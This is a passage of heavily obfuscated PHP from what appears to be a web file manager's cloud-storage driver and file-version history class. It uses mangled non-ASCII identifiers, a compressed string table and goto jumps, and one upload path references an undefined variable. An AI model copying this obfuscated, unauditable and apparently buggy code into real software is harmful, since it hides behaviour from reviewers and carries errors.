$this->cacheMethodInfoSet($¦Ù Î‘³, !0); } public function listPath($–ÏÊÂö, $ĞÛœà… = false) { $ˆ‰øÄ­¹ =& $_SERVER[³·—™¤¢]; $á¾äİ = $“²¨ªéé = array(); $this->fileList($–ÏÊÂö, $á¾äİ, $“²¨ªéé); foreach ($á¾äİ as $˜Û’õ¾£ => $³Ê´÷Õî) { $á¾äİ[$˜Û’õ¾£] = $this->folderInfo($³Ê´÷Õî, $ĞÛœà…); } foreach ($“²¨ªéé as $˜Û’õ¾£ => $³Ê´÷Õî) { $“²¨ªéé[$˜Û’õ¾£] = $this->fileInfo($³Ê´÷Õî[$ˆ‰øÄ­¹[32]], $ĞÛœà…, $³Ê´÷Õî); } return array($ˆ‰øÄ­¹[82] => $á¾äİ, $ˆ‰øÄ­¹[83] => $“²¨ªéé); } public function has($¦î“¼¿å, $‡çÍãâ = false, $¬£ïªÂì = true) { $¶’º÷õú =& $_SERVER[³·—™¤¢]; $„¶âˆë = $¶’º÷õú[12]; $®ÄÊŞœÛ = 500; $²­ğÚ“š = 0; $Ş˜Ô¾ƒÁ = 0; $ò´Ñç«« = rtrim($¦î“¼¿å, $¶’º÷õú[8]) . $¶’º÷õú[8]; while (!0) { check_abort(); $è±¦˜„» = $this->listObjs($¦î“¼¿å, $„¶âˆë, $®ÄÊŞœÛ); if (!$è±¦˜„») { return !1; } $„¶âˆë = isset($è±¦˜„»[$¶’º÷õú[1492]]) ? $è±¦˜„»[$¶’º÷õú[1492]] : $¶’º÷õú[12]; $ùÁÑ°ä = isset($è±¦˜„»[$¶’º÷õú[1493]]) ? $è±¦˜„»[$¶’º÷õú[1493]] : array(); if (empty($ùÁÑ°ä)) { break; } $¥‰Şœ§ñ = array_filter($ùÁÑ°ä, function ($ğ³ıÜø¢) { $æÀ—³íÃ =& $_SERVER[³·—™¤¢]; return $ğ³ıÜø¢[$æÀ—³íÃ[33]] == $æÀ—³íÃ[75]; }); $ÕúßÄ¹ = count($ùÁÑ°ä); $¥‰Şœ§ñ = count($¥‰Şœ§ñ); $ˆÌŠ‚æÍ = $ÕúßÄ¹ - $¥‰Şœ§ñ; if ($‡çÍãâ) { $Ş˜Ô¾ƒÁ += $¥‰Şœ§ñ; $²­ğÚ“š += $ˆÌŠ‚æÍ; if ($ÕúßÄ¹ < $®ÄÊŞœÛ) { break; } continue; } if ($¬£ïªÂì) { if ($ˆÌŠ‚æÍ) { return !0; } } else { if ($¥‰Şœ§ñ) { return !0; } } if ($ÕúßÄ¹ < $®ÄÊŞœÛ) { break; } } if ($‡çÍãâ) { return array($¶’º÷õú[207] => $²­ğÚ“š, $¶’º÷õú[208] => $Ş˜Ô¾ƒÁ); } return !1; } public function listAll($àïÄÑÌ†) { $ëÊ©ıñ =& $_SERVER[³·—™¤¢]; $¦òøÌô = $İæÓÌÅ÷ = array(); $this->fileList($àïÄÑÌ†, $¦òøÌô, $İæÓÌÅ÷, !0); $µÙÁ‹üî = array(); foreach ($İæÓÌÅ÷ as $¼äáÙÎ•) { $µÙÁ‹üî[$¼äáÙÎ•[$ëÊ©ıñ[32]]] = $¼äáÙÎ•[$ëÊ©ıñ[76]]; } foreach ($¦òøÌô as $¼äáÙÎ•) { if (is_string($¼äáÙÎ•)) { $µÙÁ‹üî[$¼äáÙÎ•] = 0; } } return $this->listAllFiles($àïÄÑÌ†, array_keys($µÙÁ‹üî), $µÙÁ‹üî); } public function canRead($à¡ñú) { return $this->exist($à¡ñú) ? !0 : !1; } public function canWrite($·ı²¢Æµ) { return $this->exist($·ı²¢Æµ) ? !0 : !1; } public function getContent($£‡›¤çé) { return $this->fileSubstr($£‡›¤çé, 0, -1); } public function setContent($Ó¢ŸĞ©¼, $Şæü³ñ = '') { $©Œ½ã’· =& $_SERVER[³·—™¤¢]; if (!$Şæü³ñ) { $¤¼ù«ÍÃ = $this->ussRequest($Ó¢ŸĞ©¼, $©Œ½ã’·[226]); return $¤¼ù«ÍÃ[$©Œ½ã’·[1214]]; } $ŒèÔ£Öê = $this->tempFile($this->pathThis($Ó¢ŸĞ©¼)); file_put_contents($ŒèÔ£Öê, $Şæü³ñ); if ($this->upload($Ó¢ŸĞ©¼, $ŒèÔ£Öê)) { $this->tempFileRemve($ŒèÔ£Öê); return !0; } return !1; } public function fileSubstr($†ÕÖı¨Ç, $ŞŒí¸¼¾, $«İäğÃ) { $ŒİõÈ™ø =& $_SERVER[³·—™¤¢]; if (!($§§Ë´îÒ = $this->link($†ÕÖı¨Ç))) { return !1; } $ú­óÂŞ” = !1; if ($«İäğÃ > 0) { $Ÿ¹‰»Í… = $ŞŒí¸¼¾ + $«İäğÃ - 1; $ú­óÂŞ” = array($ŒİõÈ™ø[1455] . $ŞŒí¸¼¾ . $ŒİõÈ™ø[386] . $Ÿ¹‰»Í…); } $İı¯Õ‹ù = url_request($§§Ë´îÒ, $ŒİõÈ™ø[230], !1, $ú­óÂŞ”); return $İı¯Õ‹ù[$ŒİõÈ™ø[770]] ? $İı¯Õ‹ù[$ŒİõÈ™ø[1216]] : !1; } public function upload($Ÿœí…š•, $¹É†–şå, $›—‡„åñ = false, $‰‘¥ø™Ñ = REPEAT_REPLACE) { $×§š¾§Ş =& $_SERVER[³·—™¤¢]; $‚£ï¤Ëó = IO::size($¹É†–şå); if ($‚£ï¤Ëó <= 1024 * 1024 * 200) { $Ô©—Û„ê = array($×§š¾§Ş[1495] . $¹É†–şå); $íò¥—æˆ = $this->ussRequest($Ÿœí…š•, $×§š¾§Ş[228], $Ô©—Û„ê); return $íò¥—æˆ[$×§š¾§Ş[1214]] ? $this->getPathOuter($Ÿœí…š•) : !1; } $îŞ›²í = 1024 * 1024 * 10; $‘¿„¿±Á = array($×§š¾§Ş[1496], $×§š¾§Ş[1497] . $‚£ï¤Ëó, $×§š¾§Ş[1498], $×§š¾§Ş[1499] . $îŞ›²í); $íò¥—æˆ = $this->ussRequest($Ÿœí…š•, $×§š¾§Ş[228], !1, $‘¿„¿±Á); if (!$íò¥—æˆ[$×§š¾§Ş[1214]]) { return !1; } $¤°œá×Ö = $íò¥—æˆ[$×§š¾§Ş[1216]]; $°°™Ùßå = 0; $–†şâ¬à = $¤°œá×Ö[$×§š¾§Ş[1500]]; $óÕÊ÷Ş© = fopen($¹É†–şå, $×§š¾§Ş[1404]); if (!$óÕÊ÷Ş©) { return !1; } do { $„ÉÇİçÛ = $¤°œá×Ö[$×§š¾§Ş[1501]]; fseek_64($óÕÊ÷Ş©, $°°™Ùßå); $€»ùá™ = fread($óÕÊ÷Ş©, $„ÉÇİçÛ); $ôÅ€Ü© = 0; do { $ôÅ€Ü©++; $¤°œá×Ö = $this->uploadPart($Ÿœí…š•, $¤°œá×Ö, $€»ùá™); } while (!$¤°œá×Ö && $ôÅ€Ü© < 3); if (!$¤°œá×Ö) { return !1; } $–†şâ¬à = $¤°œá×Ö[$×§š¾§Ş[1500]]; $°°™Ùßå += $„ÉÇİçÛ; } while ($–†şâ¬à != -1); fclose($óÕÊ÷Ş©); $‘¿„¿±Á = array($×§š¾§Ş[1502], $×§š¾§Ş[1503] . $¤°œá×Ö[$×§š¾§Ş[1504]], $×§š¾§Ş[1498]); $íò¥—æˆ = $this->ussRequest($Ÿœí…š•, $×§š¾§Ş[228], !1, $‘¿„¿±Á); return $íò¥—æˆ[$×§š¾§Ş[1214]] ? $this->getPathOuter($áıïš¥Ä) : !1; } private function uploadPart($…ƒóûç, $´÷Š¯ó, &$«ıä·ó›) { $ª¢¸ŠÃË =& $_SERVER[³·—™¤¢]; $º•Ï¬Èõ = array($ª¢¸ŠÃË[1505], $ª¢¸ŠÃË[1503] . $´÷Š¯ó[$ª¢¸ŠÃË[1504]], $ª¢¸ŠÃË[1506] . $´÷Š¯ó[$ª¢¸ŠÃË[1500]], $ª¢¸ŠÃË[142] . $´÷Š¯ó[$ª¢¸ŠÃË[1501]]); $ÜË†æÉ¢ = $this->ussRequest($…ƒóûç, $ª¢¸ŠÃË[228], $«ıä·ó›, $º•Ï¬Èõ); return !$ÜË†æÉ¢[$ª¢¸ŠÃË[1214]] ? $ÜË†æÉ¢[$ª¢¸ŠÃË[1214]] : $ÜË†æÉ¢[$ª¢¸ŠÃË[1216]]; } public function uploadFormData($ï´Ä”‰†, $¿Ş ÖËÇ = 3600) { return $this->uploadPolicy($ï´Ä”‰†, $¿Ş ÖËÇ); } public function multiUploadFormData($™ºÜ¦ŸŒ, $µí¯Á€Å = 3600) { $‘«ŠŠç­ =& $_SERVER[³·—™¤¢]; $ª“©éø« = (int) $GLOBALS[$‘«ŠŠç­[7]][$‘«ŠŠç­[76]]; return $this->uploadPolicy($™ºÜ¦ŸŒ, $µí¯Á€Å, $ª“©éø«); } private function uploadPolicy($Ìè´Å›ó, $×Œ™ÛŸü = 3600, $»ö®éà³ = 0) { $İá¹åÅ› =& $_SERVER[³·—™¤¢]; $ÙùÑÁ‘º = $İá¹åÅ›[8] . $this->bucket; $¥“øàİß = gmdate($İá¹åÅ›[1440]); $«Üù¸õö = array($İá¹åÅ›[1507] => $this->bucket, $İá¹åÅ›[1508] => $Ìè´Å›ó, $İá¹åÅ›[1509] => time() + $×Œ™ÛŸü, $İá¹åÅ›[1510] => $¥“øàİß); if ($»ö®éà³) { $«Üù¸õö[$İá¹åÅ›[1420]] = $»ö®éà³; } $È È‹áÇ = base64_encode(json_encode($«Üù¸õö)); $³¤ ÄĞê = base64_encode(hash_hmac($İá¹åÅ›[1477], "\x50\x4f\123\124\x26{$ÙùÑÁ‘º}\x26{$¥“øàİß}\46{$È È‹áÇ}", md5("{$this->userpass}"), !0)); $Á‰ëåœÁ = array($İá¹åÅ›[1345] => $È È‹áÇ, $İá¹åÅ›[1511] => "\x55\120\x59\125\116\40{$this->username}\72{$³¤ ÄĞê}", $İá¹åÅ›[181] => $this->endpoint . $ÙùÑÁ‘º); return $Á‰ëåœÁ; } public function download($ÌëŞ¢àæ, $×‡¤„ş×) { $­ú‡”úæ = IO::getPathInner(IO::mkfile($×‡¤„ş×)); if (!($¸æû£´ = $this->link($ÌëŞ¢àæ))) { return !1; } $ÈÆÛ¯Û = 0; $á”é¾÷ = 1024 * 200; $“©à¯“ú = fopen($­ú‡”úæ, $_SERVER[³·—™¤¢][1461]); while (!0) { $„Å¨Šâ = $this->fileSubstr($ÌëŞ¢àæ, $ÈÆÛ¯Û, $á”é¾÷); if ($„Å¨Šâ === !1) { return !1; } fwrite($“©à¯“ú, $„Å¨Šâ); $ÈÆÛ¯Û += $á”é¾÷; if (strlen($„Å¨Šâ) < $á”é¾÷) { break; } } fclose($“©à¯“ú); return $×‡¤„ş×; } public function link($¶§“©·ù, $ÆšƒÁÙÇ = array()) { $ü†¤Û›¬ =& $_SERVER[³·—™¤¢]; $¶§“©·ù = trim($¶§“©·ù, $ü†¤Û›¬[8]); if (!empty($this->token)) { $ŸÎªò¬Ù = strtotime(date($ü†¤Û›¬[1512])); $·³Œ¾å” = substr(md5($this->token . $ü†¤Û›¬[284] . $ŸÎªò¬Ù . $ü†¤Û›¬[1513] . $¶§“©·ù), 12, 8) . $ŸÎªò¬Ù; $ÆšƒÁÙÇ[] = $ü†¤Û›¬[1514] . $·³Œ¾å”; } $£ ¤ËÎ = !empty($ÆšƒÁÙÇ) ? $ü†¤Û›¬[73] . implode($ü†¤Û›¬[284], $ÆšƒÁÙÇ) : $ü†¤Û›¬[12]; return $this->getHost() . $ü†¤Û›¬[8] . $¶§“©·ù . $£ ¤ËÎ; } public function fileOut($°¦áüï, $ëüä£¨“ = false, $Ò‹·úôÁ = false, $ºÚ‚ş× = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($°¦áüï, $ëüä£¨“, $Ò‹·úôÁ, $ºÚ‚ş×); } if (!$Ò‹·úôÁ) { $Ò‹·úôÁ = $this->pathThis($°¦áüï); } $«ÖğÜü = $ëüä£¨“ ? array($_SERVER[³·—™¤¢][1515] . rawurlencode($Ò‹·úôÁ)) : array(); $á­¤¹Ë = $this->link($°¦áüï, $«ÖğÜü); $this->fileOutLink($á­¤¹Ë); } public function fileOutServer($ÔÄ’ïƒ, $ì³ó´¸æ = false, $çÒ”†ØÎ = false, $ƒ‹Õüüş = '') { parent::fileOut($ÔÄ’ïƒ, $ì³ó´¸æ, $çÒ”†ØÎ, $ƒ‹Õüüş); } public function fileOutImage($Óúª‹ˆ‰, $ùÓú†î½ = 250) { $ç˜¾ á = $this->link($Óúª‹ˆ‰ . $_SERVER[³·—™¤¢][1516] . $ùÓú†î½); $this->fileOutLink($ç˜¾ á); } public function fileOutImageServer($ØƒÖôŒÎ, $îï‰Á¼Ş = 250) { parent::fileOutImage($ØƒÖôŒÎ, $îï‰Á¼Ş); } public function hashMd5($¿¤¾¸Äª) { $“¤¨œÃŒ =& $_SERVER[³·—™¤¢]; $¼âí¹…İ = $this->_objectMeta($¿¤¾¸Äª); return isset($¼âí¹…İ[$“¤¨œÃŒ[212]]) ? $¼âí¹…İ[$“¤¨œÃŒ[212]] : !1; } public function size($˜Ë´Ù‡) { $‰»„†‡Ş = $this->objectMeta($˜Ë´Ù‡); return $‰»„†‡Ş ? $‰»„†‡Ş[$_SERVER[³·—™¤¢][76]] : 0; } public function info($“¢ÎŸÎè) { if ($this->isFolder($“¢ÎŸÎè)) { return $this->folderInfo($“¢ÎŸÎè); } else { if ($this->isFile($“¢ÎŸÎè)) { return $this->fileInfo($“¢ÎŸÎè); } } return !1; } public function exist($½áæöî) { return $this->isFile($½áæöî) || $this->isFolder($½áæöî); } public function isFile($¯µöÅŠ) { return !$this->isFolder($¯µöÅŠ) && $this->objectMeta($¯µöÅŠ); } public function isFolder($‰²Úêéù) { return $this->cacheMethod($_SERVER[³·—™¤¢][165], $‰²Úêéù); } protected function objectMeta($ñëìêŸ‹) { return $this->cacheMethod($_SERVER[³·—™¤¢][167], $ñëìêŸ‹); } protected function _objectMeta($¸£Ø ãó) { $©ÕÍ©»¡ =& $_SERVER[³·—™¤¢]; if ($¸£Ø ãó == $©ÕÍ©»¡[12] || $¸£Ø ãó == $©ÕÍ©»¡[8]) { return array(); } $ê€Åˆ¹ë = $this->ussRequest($¸£Ø ãó, $©ÕÍ©»¡[1517]); if (!$ê€Åˆ¹ë[$©ÕÍ©»¡[1214]]) { return null; } $Í¨ÉøÄ‡ = isset($ê€Åˆ¹ë[$©ÕÍ©»¡[1216]]) ? $ê€Åˆ¹ë[$©ÕÍ©»¡[1216]] : array(); if (!isset($Í¨ÉøÄ‡[$©ÕÍ©»¡[1518]])) { return null; } $‡—©à–® = array($©ÕÍ©»¡[33] => isset($Í¨ÉøÄ‡[$©ÕÍ©»¡[1518]]) ? $Í¨ÉøÄ‡[$©ÕÍ©»¡[1518]] : null, $©ÕÍ©»¡[76] => isset($Í¨ÉøÄ‡[$©ÕÍ©»¡[1519]]) ? $Í¨ÉøÄ‡[$©ÕÍ©»¡[1519]] : null, $©ÕÍ©»¡[212] => isset($Í¨ÉøÄ‡[$©ÕÍ©»¡[1520]]) ? $Í¨ÉøÄ‡[$©ÕÍ©»¡[1520]] : null, $©ÕÍ©»¡[1487] => isset($Í¨ÉøÄ‡[$©ÕÍ©»¡[1521]]) ? $Í¨ÉøÄ‡[$©ÕÍ©»¡[1521]] : null); $‡—©à–®[$©ÕÍ©»¡[1488]] = isset($Í¨ÉøÄ‡[$©ÕÍ©»¡[1522]]) ? strtotime($Í¨ÉøÄ‡[$©ÕÍ©»¡[1522]]) : $‡—©à–®[$©ÕÍ©»¡[1487]]; return $‡—©à–®; } protected function _isFolder($ÁÕôÍ½) { $¬æ­®®Ó =& $_SERVER[³·—™¤¢]; if ($ÁÕôÍ½ == $¬æ­®®Ó[12] || $ÁÕôÍ½ == $¬æ­®®Ó[8]) { return !0; } $œÉò±€ = $this->_objectMeta($ÁÕôÍ½); return isset($œÉò±€[$¬æ­®®Ó[33]]) && $œÉò±€[$¬æ­®®Ó[33]] == $¬æ­®®Ó[75] ? !0 : !1; } } goto BÇÖÃæİ´à; eÖ®±Ò¨¨â: define($_SERVER[³·—™¤¢][0], $_SERVER[³·—™¤¢][1]); $_SERVER[¯”ıî’ß] = explode($_SERVER[³·—™¤¢][2], gzinflate(substr($_SERVER[³·—™¤¢][3], 10, -8))); function binCheckEq($¯Ï¢ğ‹ş, $œòÇ‰ıŸ) { return $¯Ï¢ğ‹ş == $œòÇ‰ıŸ; } goto Bƒ¶ÇÂâ”à; fÚÕàÆêå: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $–³ó®Ñ¾ =& $_SERVER[³·—™¤¢]; $­‘¯³Ôæ = $GLOBALS[$–³ó®Ñ¾[6]][$–³ó®Ñ¾[89]]; if ($­‘¯³Ôæ[$–³ó®Ñ¾[1231]] != 1) { return; } if ($­‘¯³Ôæ[$–³ó®Ñ¾[1232]] <= 0) { return; } if (isset($_REQUEST[$–³ó®Ñ¾[1233]]) && $_REQUEST[$–³ó®Ñ¾[1233]] == $–³ó®Ñ¾[88]) { return; } Hook::bind($–³ó®Ñ¾[1234], $–³ó®Ñ¾[1235]); Hook::bind($–³ó®Ñ¾[1236], $–³ó®Ñ¾[1237]); Hook::bind($–³ó®Ñ¾[1238], $–³ó®Ñ¾[1239]); Hook::bind($–³ó®Ñ¾[1240], $–³ó®Ñ¾[1241]); Hook::bind($–³ó®Ñ¾[1242], $–³ó®Ñ¾[1243]); Hook::bind($–³ó®Ñ¾[1244], $–³ó®Ñ¾[1245]); } public static function eventBeforeUpload($¥€üéú”) { if ($¥€üéú”[3] && $¥€üéú”[3] != REPEAT_REPLACE) { return; } $¤º€ñÀ‡ = self::parsePath($¥€üéú”[0]); if (!$¤º€ñÀ‡) { return; } self::add($¤º€ñÀ‡); } public static function eventBeforeEdit($‰ôüÚ™) { $Ì‡¥‰• = self::parsePath($‰ôüÚ™[0]); if (!$Ì‡¥‰•) { return; } self::add($Ì‡¥‰•); } public static function eventBeforeCopyFile($¹¯™ˆËÖ, $ª¯Ï­Æ“, $ïÛùç½Ù, $º…—ûÍÅ, $’«õ–û², $‚½öÙŸ™) { $çŠåİƒğ =& $_SERVER[³·—™¤¢]; if (isset($ïÛùç½Ù->_data[$çŠåİƒğ[1178]]) && $ïÛùç½Ù->_data[$çŠåİƒğ[1178]]) { return; } $¹ÚÉŒã¢ = $ïÛùç½Ù->getPathOuter($º…—ûÍÅ); $¦ŸĞ±´ = self::parsePath($¹ÚÉŒã¢); if (!$¦ŸĞ±´) { return; } self::add($¦ŸĞ±´); } public static function eventBeforeRename($§ÅÏ«Ÿƒ) { $üßÊË¯“ =& $_SERVER[³·—™¤¢]; $×¬¾ûÌ = self::parsePath($§ÅÏ«Ÿƒ[0]); if (!$×¬¾ûÌ) { return; } $ûü™é¦ = self::checkInHistory($×¬¾ûÌ); if (!$ûü™é¦) { return; } if ($ûü™é¦[$üßÊË¯“[33]] == $üßÊË¯“[199]) { $ğÔ¢õ£„ = self::listData($×¬¾ûÌ); if ($ğÔ¢õ£„ && $ğÔ¢õ£„[$üßÊË¯“[369]]) { self::moveHistory($×¬¾ûÌ, $§ÅÏ«Ÿƒ[1]); } } else { IO::rename($ûü™é¦[$üßÊË¯“[84]], $§ÅÏ«Ÿƒ[1]); } } public static function eventBeforeMove($ÖÔÒı¥) { $üÃ˜¯ğö =& $_SERVER[³·—™¤¢]; $ŒŸîìóÏ = self::parsePath($ÖÔÒı¥[0]); if (!$ŒŸîìóÏ) { return; } $¨€»úâ¬ = self::parsePath($ÖÔÒı¥[1]); if (!$¨€»úâ¬) { return; } $Äæ£¬…ù = $ÖÔÒı¥[3]; $˜ä¥¤Í = self::checkInHistory($ŒŸîìóÏ); if (!$˜ä¥¤Í) { return; } $†ãÛÛŠ = self::pathHistory($¨€»úâ¬); if ($˜ä¥¤Í[$üÃ˜¯ğö[33]] == $üÃ˜¯ğö[199]) { $é‡±èÜğ = self::listData($ŒŸîìóÏ); $º¦¿®Ï” = rtrim($¨€»úâ¬, $üÃ˜¯ğö[8]) . $üÃ˜¯ğö[8] . ($Äæ£¬…ù ? $Äæ£¬…ù : get_path_this($ŒŸîìóÏ)); $šŠª¸ÁÙ = self::listData($º¦¿®Ï”); if ($é‡±èÜğ && $é‡±èÜğ[$üÃ˜¯ğö[369]] && $šŠª¸ÁÙ && $šŠª¸ÁÙ[$üÃ˜¯ğö[369]]) { return self::clear($ŒŸîìóÏ); } if ($é‡±èÜğ && $é‡±èÜğ[$üÃ˜¯ğö[369]]) { self::moveHistory($ŒŸîìóÏ, $Äæ£¬…ù, $†ãÛÛŠ); } } else { IO::move($˜ä¥¤Í[$üÃ˜¯ğö[84]], $†ãÛÛŠ, !1, $Äæ£¬…ù); self::clearEmptyFolder(IO::pathFather($˜ä¥¤Í[$üÃ˜¯ğö[84]])); } } public static function eventAfterRemove($·Ê”–äû, $Æ©‡Û) { $¿¹Èæü¯ =& $_SERVER[³·—™¤¢]; if (!$Æ©‡Û) { return; } $Ü¯·ö¢ú = self::parsePath($·Ê”–äû[0]); if (!$Ü¯·ö¢ú) { return; } $á…õçîØ = self::checkInHistory($Ü¯·ö¢ú); if (!$á…õçîØ) { return; } if ($á…õçîØ[$¿¹Èæü¯[33]] == $¿¹Èæü¯[199]) { $Ä¡í™ŒÀ = self::listData($Ü¯·ö¢ú, !1); if ($Ä¡í™ŒÀ && $Ä¡í™ŒÀ[$¿¹Èæü¯[369]]) { self::clear($Ü¯·ö¢ú, !1); } } else { IO::remove($á…õçîØ[$¿¹Èæü¯[84]]); self::clearEmptyFolder(IO::pathFather($á…õçîØ[$¿¹Èæü¯[84]])); } } private static function checkInHistory($ãµóå„ñ) { $Ÿµå•º = self::pathHistory($ãµóå„ñ); if (!IO::exist($Ÿµå•º)) { $Ÿµå•º .= $_SERVER[³·—™¤¢][1246]; } return IO::exist($Ÿµå•º) ? IO::info($Ÿµå•º) : !1; } private static function parsePath($Îˆ·¡§ì) { $‘·àÌô =& $_SERVER[³·—™¤¢]; if (!$Îˆ·¡§ì) { return !1; } if ($GLOBALS[$‘·àÌô[1247]]) { return; } $‰²ê—É“ = KodIO::parse($Îˆ·¡§ì); $Â¿–Êñß = $‰²ê—É“[$‘·àÌô[33]]; $Á÷ÛÓ¬¨ = !$Â¿–Êñß || $Â¿–Êñß == KodIO::KOD_IO || $Â¿–Êñß == KodIO::KOD_SHARE_ITEM; if (!$Á÷ÛÓ¬¨ || !$‰²ê—É“[$‘·àÌô[1248]]) { return !1; } if (substr($Îˆ·¡§ì, 0, strlen(DATA_PATH . $‘·àÌô[1249])) == DATA_PATH . $‘·àÌô[1249]) { return !1; } if ($Â¿–Êñß == KodIO::KOD_SHARE_ITEM) { $øË‚ïË = IO::init($Îˆ·¡§ì); if ($øË‚ïË->pathParse[$‘·àÌô[1174]]) { return self::parsePath($øË‚ïË->pathParse[$‘·àÌô[1174]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Æ“¿Ä‹— = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $‘·àÌô[1250]); foreach ($Æ“¿Ä‹— as $Ñ¾¡óİ£) { if (!$Â¿–Êñß && substr($Îˆ·¡§ì, 0, strlen($Ñ¾¡óİ£)) == $Ñ¾¡óİ£) { return !1; } } self::log($GLOBALS[$‘·àÌô[1169]] . $‘·àÌô[1251] . $Îˆ·¡§ì); return $Îˆ·¡§ì; } private static function pathHistory($›§óÇ ³) { $¨÷ÇƒøÎ =& $_SERVER[³·—™¤¢]; $ˆ§¢ïÈ = self::$_historyBase . ltrim(KodIO::clear($›§óÇ ³), $¨÷ÇƒøÎ[8]); $ˆ§¢ïÈ = str_replace(array($¨÷ÇƒøÎ[1252]), array($¨÷ÇƒøÎ[1253]), $ˆ§¢ïÈ); return $ˆ§¢ïÈ; } public static function log($¤„ñ©ã) { } public static function historyCount($ßÂ°˜ í) { $Şóóû°á =& $_SERVER[³·—™¤¢]; $’„¯œ¹ù = array(); $„úø–¹ = array(); foreach ($ßÂ°˜ í as $Ò¡¥öÇç) { $£ÅÙ‹÷ = get_path_father($Ò¡¥öÇç); if (!$„úø–¹[$£ÅÙ‹÷]) { $„úø–¹[$£ÅÙ‹÷] = array(); } $„úø–¹[$£ÅÙ‹÷][] = get_path_this($Ò¡¥öÇç); } foreach ($„úø–¹ as $£ÅÙ‹÷ => $éœ´ùÚ¡) { $€şº§—¶ = self::parsePath($£ÅÙ‹÷); if (!$€şº§—¶) { continue; } foreach ($éœ´ùÚ¡ as $î÷ËÓ–³) { $¿¨µ¬Ú = self::listData(rtrim($€şº§—¶, $Şóóû°á[8]) . $Şóóû°á[8] . $î÷ËÓ–³, !1); if ($¿¨µ¬Ú && $¿¨µ¬Ú[$Şóóû°á[369]]) { $’„¯œ¹ù[rtrim($£ÅÙ‹÷, $Şóóû°á[8]) . $Şóóû°á[8] . $î÷ËÓ–³] = count($¿¨µ¬Ú[$Şóóû°á[369]]); } } } return $’„¯œ¹ù; } public static function add($Ú…‘…¸Ò) { $ƒÃó¶ğ =& $_SERVER[³·—™¤¢]; $ÇœñÒ‘“ = self::listData($Ú…‘…¸Ò); if (!$ÇœñÒ‘“) { return; } $¬ˆı¯ãû = Model($ƒÃó¶ğ[790])->get($ƒÃó¶ğ[1254]); $Ù¦ãæô“ = $GLOBALS[$ƒÃó¶ğ[6]][$ƒÃó¶ğ[89]][$ƒÃó¶ğ[1232]]; $²áÑäó = $¬ˆı¯ãû == $ƒÃó¶ğ[1255] ? min(5, $Ù¦ãæô“) : $Ù¦ãæô“; if ($Ù¦ãæô“ <= 0) { return; } $»ñŒİÆ‚ = IO::info($Ú…‘…¸Ò); $ÛôÈ÷Ç = $ÇœñÒ‘“[$ƒÃó¶ğ[369]]; if ($»ñŒİÆ‚[$ƒÃó¶ğ[76]] == 0) { return; } if ($»ñŒİÆ‚[$ƒÃó¶ğ[76]] >= 1024 * 1024 * 500) { return !1; } $æÕùÁ®¢ = IO::hashSimple($Ú…‘…¸Ò); if ($ÛôÈ÷Ç && $ÛôÈ÷Ç[0][$ƒÃó¶ğ[177]] == $æÕùÁ®¢) { return !0; } if (array_key_exists($ƒÃó¶ğ[202], $»ñŒİÆ‚) && !$»ñŒİÆ‚[$ƒÃó¶ğ[202]]) { return !1; } $§Ìâø—Ÿ = short_id(time()); $ ˆ„—Ø = array($ƒÃó¶ğ[399] => $§Ìâø—Ÿ, $ƒÃó¶ğ[177] => $æÕùÁ®¢, $ƒÃó¶ğ[32] => $»ñŒİÆ‚[$ƒÃó¶ğ[32]] . $ƒÃó¶ğ[10] . date($ƒÃó¶ğ[1256]) . rand_string(1), $ƒÃó¶ğ[76] => $»ñŒİÆ‚[$ƒÃó¶ğ[76]], $ƒÃó¶ğ[454] => USER_ID, $ƒÃó¶ğ[200] => time(), $ƒÃó¶ğ[1257] => $ƒÃó¶ğ[12]); IO::mkdir($ÇœñÒ‘“[$ƒÃó¶ğ[1258]]); $ïé í“× = IO::copy($Ú…‘…¸Ò, $ÇœñÒ‘“[$ƒÃó¶ğ[1258]], !1, $ ˆ„—Ø[$ƒÃó¶ğ[32]]); if (!$ïé í“×) { self::clearEmptyFolder($ÇœñÒ‘“[$ƒÃó¶ğ[1258]]); return !1; } array_unshift($ÛôÈ÷Ç, $ ˆ„—Ø); if (count($ÛôÈ÷Ç) > $²áÑäó) { $Ô˜ƒŞß» = array_slice($ÛôÈ÷Ç, $²áÑäó); foreach ($Ô˜ƒŞß» as $¬ñœ×Ë¹) { IO::remove($ÇœñÒ‘“[$ƒÃó¶ğ[1258]] . $¬ñœ×Ë¹[$ƒÃó¶ğ[32]]); } $ÛôÈ÷Ç = array_slice($ÛôÈ÷Ç, 0, $²áÑäó); } return self::saveData($ÇœñÒ‘“[$ƒÃó¶ğ[1259]], $ÛôÈ÷Ç); } public static function remove($¬èÍ¨’›, $¤Š‡¦·) { $ÚÁ³•Ş° =& $_SERVER[³·—™¤¢]; $éù”ş¯œ = self::listData($¬èÍ¨’›); $şï…¯Çœ = array(); if (!$éù”ş¯œ) { return !1; } foreach ($éù”ş¯œ[$ÚÁ³•Ş°[369]] as $‰Ì·’ƒ²) { if ($‰Ì·’ƒ²[$ÚÁ³•Ş°[399]] == $¤Š‡¦·) { IO::remove($éù”ş¯œ[$ÚÁ³•Ş°[1258]] . $‰Ì·’ƒ²[$ÚÁ³•Ş°[32]]); continue; } $şï…¯Çœ[] = $‰Ì·’ƒ²; } return self::saveData($éù”ş¯œ[$ÚÁ³•Ş°[1259]], $şï…¯Çœ); } public static function clear($Ïü´åü¾, $ßöß¦Ë = true) { $ğì”©‚ =& $_SERVER[³·—™¤¢]; $©Õ÷‚Å = self::listData($Ïü´åü¾, $ßöß¦Ë); if (!$©Õ÷‚Å) { return !1; } foreach ($©Õ÷‚Å[$ğì”©‚[369]] as $±‹´äœ„) { IO::remove($©Õ÷‚Å[$ğì”©‚[1258]] . $±‹´äœ„[$ğì”©‚[32]]); } return self::saveData($©Õ÷‚Å[$ğì”©‚[1259]], array()); } public static function moveHistory($°À§¡á—, $†ç®ö£¶ = '', $¨Ú—“š = '') { $ûÚËã‘‡ =& $_SERVER[³·—™¤¢]; $’€ü¶é¡ = self::listData($°À§¡á—, !1); if (!$’€ü¶é¡ || !$’€ü¶é¡[$ûÚËã‘‡[369]]) { return !1; } $ ÓŒøã‚ = $ûÚËã‘‡[1246]; $†ç®ö£¶ = $†ç®ö£¶ ? $†ç®ö£¶ : get_path_this($°À§¡á—); $¨Ú—“š = $¨Ú—“š ? $¨Ú—“š : $’€ü¶é¡[$ûÚËã‘‡[1258]]; $èõ‹€”ğ = substr(get_path_this($’€ü¶é¡[$ûÚËã‘‡[1259]]), 0, -strlen($ ÓŒøã‚)); foreach 